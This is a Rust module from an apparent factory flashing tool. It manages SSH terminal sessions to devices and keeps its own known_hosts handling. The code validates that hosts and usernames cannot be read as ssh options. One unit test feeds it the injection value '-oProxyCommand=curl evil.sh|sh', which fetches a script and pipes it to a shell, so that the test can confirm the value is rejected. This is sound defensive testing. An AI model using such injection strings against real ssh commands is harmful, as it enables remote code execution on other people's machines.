use crate::errors::{Result, SigilError};
use crate::models::SshExitInfo;
use portable_pty::{native_pty_system, Child, CommandBuilder, MasterPty, PtySize};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use tauri::{AppHandle, Emitter, Manager};

pub const SSH_OUTPUT_EVENT: &str = "ssh-output";
pub const SSH_EXIT_EVENT: &str = "ssh-exit";

/// Sesión SSH activa: una sola a la vez, igual que el flasheo. Conectar a un
/// dispositivo nuevo reemplaza la sesión anterior en vez de apilarlas.
struct SshSession {
    master: Box<dyn MasterPty + Send>,
    writer: Box<dyn Write + Send>,
    child: Box<dyn Child + Send + Sync>,
}

#[derive(Default)]
pub struct SshSessionState(Mutex<Option<SshSession>>);

/// Rechaza cualquier host o usuario que pueda leerse como una opción de ssh
/// en vez de un destino. Sin esto, un valor tecleado en el selector de
/// dispositivo como "-oProxyCommand=..." inyectaría flags arbitrarios al
/// comando real: no hay shell de por medio (se pasa como argv, no como texto
/// interpretado), pero ssh mismo no distingue "mi primer argumento posicional
/// empieza con guion" de "esto es una opción más".
pub fn validate_ssh_target(value: &str, field: &str) -> Result<()> {
    if value.is_empty() {
        return Err(SigilError::Validation(format!("{} no puede estar vacío", field)));
    }
    if value.starts_with('-') {
        return Err(SigilError::Validation(format!(
            "{} no puede empezar con '-': se leería como una opción de ssh",
            field
        )));
    }
    if value.chars().any(|c| c.is_control() || c.is_whitespace()) {
        return Err(SigilError::Validation(format!(
            "{} no puede contener espacios ni caracteres de control",
            field
        )));
    }
    Ok(())
}

/// Ruta del known_hosts propio de la estación, separado del
/// `~/.ssh/known_hosts` real del operario. Los equipos que fabrica esta app
/// cambian de clave de host cada vez que se reflashean con el mismo
/// hostname: eso no es un hombre-en-el-medio, es el flujo normal de fábrica,
/// y no debe ensuciar (ni depender de) la configuración SSH personal de
/// quien opera la estación.
pub fn known_hosts_path() -> Result<PathBuf> {
    let proj_dirs = directories::ProjectDirs::from("com", "sigil", "sigil-flash").ok_or_else(|| {
        SigilError::Internal("No se pudo determinar el directorio de datos local del usuario".to_string())
    })?;
    let dir = proj_dirs.data_local_dir();
    std::fs::create_dir_all(dir)?;
    Ok(dir.join("ssh_known_hosts"))
}

/// Argumentos del cliente ssh. Función pura y separada de la ejecución para
/// poder probarla sin abrir un pty ni una conexión real.
///
/// `StrictHostKeyChecking=accept-new` acepta en silencio la clave de un host
/// nunca visto (el caso normal: equipo recién fabricado) pero sigue
/// rechazando —y avisando por la propia terminal— si un host YA conocido
/// presenta una clave distinta, que es la señal real de alerta.
pub fn ssh_command_args(host: &str, port: u16, username: &str, known_hosts_path: &Path) -> Vec<String> {
    vec![
        "-tt".to_string(),
        "-o".to_string(),
        format!("UserKnownHostsFile={}", known_hosts_path.display()),
        "-o".to_string(),
        "StrictHostKeyChecking=accept-new".to_string(),
        "-o".to_string(),
        "ServerAliveInterval=15".to_string(),
        "-o".to_string(),
        "ServerAliveCountMax=4".to_string(),
        "-p".to_string(),
        port.to_string(),
        format!("{}@{}", username, host),
    ]
}

/// Patrón que `ssh-keygen -R` necesita para encontrar la entrada: los puertos
/// no estándar se registran como "[host]:puerto"; el 22 se registra tal cual.
pub fn known_hosts_pattern(host: &str, port: u16) -> String {
    if port == 22 {
        host.to_string()
    } else {
        format!("[{}]:{}", host, port)
    }
}

pub fn connect(
    state: &SshSessionState,
    app: &AppHandle,
    host: String,
    port: u16,
    username: String,
    cols: u16,
    rows: u16,
) -> Result<()> {
    validate_ssh_target(&host, "El host")?;
    validate_ssh_target(&username, "El usuario")?;

    let known_hosts = known_hosts_path()?;

    // Cualquier sesión previa se cierra antes de abrir la nueva: una sola
    // terminal activa a la vez, igual que un solo flasheo a la vez.
    disconnect(state)?;

    let pty_system = native_pty_system();
    let pair = pty_system
        .openpty(PtySize { rows, cols, pixel_width: 0, pixel_height: 0 })
        .map_err(|e| SigilError::Internal(format!("No se pudo abrir el pseudo-terminal: {}", e)))?;

    let mut cmd = CommandBuilder::new("ssh");
    cmd.args(ssh_command_args(&host, port, &username, &known_hosts));

    let child = pair
        .slave
        .spawn_command(cmd)
        .map_err(|e| SigilError::Internal(format!("No se pudo lanzar ssh: {}", e)))?;
    // El extremo esclavo debe soltarse en este proceso: si se queda abierto
    // aquí, el lado maestro nunca ve EOF cuando el proceso hijo termina.
    drop(pair.slave);

    let reader = pair
        .master
        .try_clone_reader()
        .map_err(|e| SigilError::Internal(format!("No se pudo leer del pseudo-terminal: {}", e)))?;
    let writer = pair
        .master
        .take_writer()
        .map_err(|e| SigilError::Internal(format!("No se pudo escribir en el pseudo-terminal: {}", e)))?;

    {
        let mut guard = state.0.lock().unwrap();
        *guard = Some(SshSession { master: pair.master, writer, child });
    }

    spawn_reader_thread(app.clone(), reader);

    Ok(())
}

/// Bombea la salida del pty hacia el frontend como eventos, y avisa cuando la
/// sesión termina por sí sola. Vive en su propio hilo del sistema (no una
/// tarea async) porque `read()` sobre el pty bloquea.
fn spawn_reader_thread(app: AppHandle, mut reader: Box<dyn Read + Send>) {
    std::thread::spawn(move || {
        let mut buf = [0u8; 8192];
        loop {
            match reader.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => {
                    let _ = app.emit(SSH_OUTPUT_EVENT, buf[..n].to_vec());
                }
                Err(_) => break,
            }
        }

        let state = app.state::<SshSessionState>();
        let mut guard = state.0.lock().unwrap();
        let exit_info = match guard.take() {
            Some(mut session) => match session.child.wait() {
                Ok(status) => SshExitInfo {
                    code: Some(status.exit_code() as i32),
                    message: format!("Sesión terminada: {}", status),
                },
                Err(e) => SshExitInfo {
                    code: None,
                    message: format!("Sesión terminada (no se pudo leer el código de salida: {})", e),
                },
            },
            // `disconnect()` ya la había limpiado: el operario cerró la
            // sesión a propósito, no hace falta anunciar nada más.
            None => return,
        };
        drop(guard);
        let _ = app.emit(SSH_EXIT_EVENT, exit_info);
    });
}

pub fn write(state: &SshSessionState, data: &str) -> Result<()> {
    let mut guard = state.0.lock().unwrap();
    match guard.as_mut() {
        Some(session) => {
            session.writer.write_all(data.as_bytes())?;
            session.writer.flush()?;
            Ok(())
        }
        None => Err(SigilError::Validation("No hay ninguna sesión SSH activa".to_string())),
    }
}

pub fn resize(state: &SshSessionState, cols: u16, rows: u16) -> Result<()> {
    let guard = state.0.lock().unwrap();
    match guard.as_ref() {
        Some(session) => session
            .master
            .resize(PtySize { rows, cols, pixel_width: 0, pixel_height: 0 })
            .map_err(|e| SigilError::Internal(format!("No se pudo redimensionar el pseudo-terminal: {}", e))),
        // Redimensionar sin sesión activa no es un error: el contenedor del
        // terminal en la interfaz puede reajustarse antes de conectar.
        None => Ok(()),
    }
}

pub fn disconnect(state: &SshSessionState) -> Result<()> {
    let mut guard = state.0.lock().unwrap();
    if let Some(mut session) = guard.take() {
        let _ = session.child.kill();
    }
    Ok(())
}

pub fn forget_host_key(host: &str, port: u16) -> Result<()> {
    forget_host_key_at(host, port, &known_hosts_path()?)
}

/// Separada de `forget_host_key` para poder apuntarla a un known_hosts de
/// prueba en vez del real de la estación.
fn forget_host_key_at(host: &str, port: u16, known_hosts: &Path) -> Result<()> {
    if !known_hosts.exists() {
        return Ok(());
    }
    let pattern = known_hosts_pattern(host, port);
    let status = std::process::Command::new("ssh-keygen")
        .args(["-R", &pattern, "-f"])
        .arg(known_hosts)
        .status()?;
    if !status.success() {
        return Err(SigilError::Internal(format!("ssh-keygen no pudo olvidar la clave de '{}'", pattern)));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[test]
    fn test_valid_targets_pass() {
        assert!(validate_ssh_target("sigil-device-07.local", "host").is_ok());
        assert!(validate_ssh_target("192.168.1.42", "host").is_ok());
        assert!(validate_ssh_target("sigil", "usuario").is_ok());
    }

    #[test]
    fn test_target_starting_with_dash_is_rejected() {
        let err = validate_ssh_target("-oProxyCommand=curl evil.sh|sh", "host").unwrap_err();
        assert!(err.to_string().contains("empezar con"), "{}", err);
    }

    #[test]
    fn test_empty_target_is_rejected() {
        assert!(validate_ssh_target("", "host").is_err());
    }

    #[test]
    fn test_target_with_whitespace_or_control_chars_is_rejected() {
        assert!(validate_ssh_target("sigil device", "host").is_err());
        assert!(validate_ssh_target("sigil\ndevice", "usuario").is_err());
        assert!(validate_ssh_target("sigil\tdevice", "usuario").is_err());
    }

    #[test]
    fn test_command_args_never_let_the_target_be_mistaken_for_a_flag() {
        let known_hosts = PathBuf::from("/tmp/sigil-flash-test-known-hosts");
        let args = ssh_command_args("sigil-device-07.local", 22, "sigil", &known_hosts);
        // El destino siempre es el último argumento.
        assert_eq!(args.last().unwrap(), "sigil@sigil-device-07.local");
        assert!(args.contains(&"22".to_string()));
        assert!(args.iter().any(|a| a.contains("UserKnownHostsFile=")));
        assert!(args.iter().any(|a| a == "StrictHostKeyChecking=accept-new"));
    }

    #[test]
    fn test_non_default_port_uses_bracket_syntax_for_known_hosts() {
        assert_eq!(known_hosts_pattern("sigil-device-07.local", 22), "sigil-device-07.local");
        assert_eq!(known_hosts_pattern("sigil-device-07.local", 2222), "[sigil-device-07.local]:2222");
    }

    /// El caso real que motiva `forget_host_key`: el equipo se reflasheó con
    /// el mismo hostname y ahora tiene una clave de host distinta.
    #[test]
    fn test_forget_host_key_removes_only_the_matching_entry() {
        let dir = tempdir().unwrap();
        let known_hosts = dir.path().join("known_hosts");
        std::fs::write(
            &known_hosts,
            "sigil-device-07.local ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIQfakefakefakefakefakefakefakefakefake\n\
             otro-equipo.local ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIQotrootrootrootrootrootrootrootrootroo\n",
        )
        .unwrap();

        forget_host_key_at("sigil-device-07.local", 22, &known_hosts).unwrap();

        let contenido = std::fs::read_to_string(&known_hosts).unwrap();
        assert!(!contenido.contains("sigil-device-07.local"), "{}", contenido);
        assert!(contenido.contains("otro-equipo.local"), "{}", contenido);
    }

    #[test]
    fn test_forget_host_key_without_known_hosts_file_is_a_no_op() {
        let dir = tempdir().unwrap();
        let known_hosts = dir.path().join("no-existe-todavia");
        assert!(forget_host_key_at("sigil-device-07.local", 22, &known_hosts).is_ok());
    }

    #[test]
    fn test_forget_host_key_on_a_non_default_port_uses_the_bracket_pattern() {
        let dir = tempdir().unwrap();
        let known_hosts = dir.path().join("known_hosts");
        std::fs::write(
            &known_hosts,
            "[sigil-device-08.local]:2222 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIQfakefakefakefakefakefakefake\n",
        )
        .unwrap();

        forget_host_key_at("sigil-device-08.local", 2222, &known_hosts).unwrap();

        let contenido = std::fs::read_to_string(&known_hosts).unwrap();
        assert!(!contenido.contains("sigil-device-08.local"), "{}", contenido);
    }
}
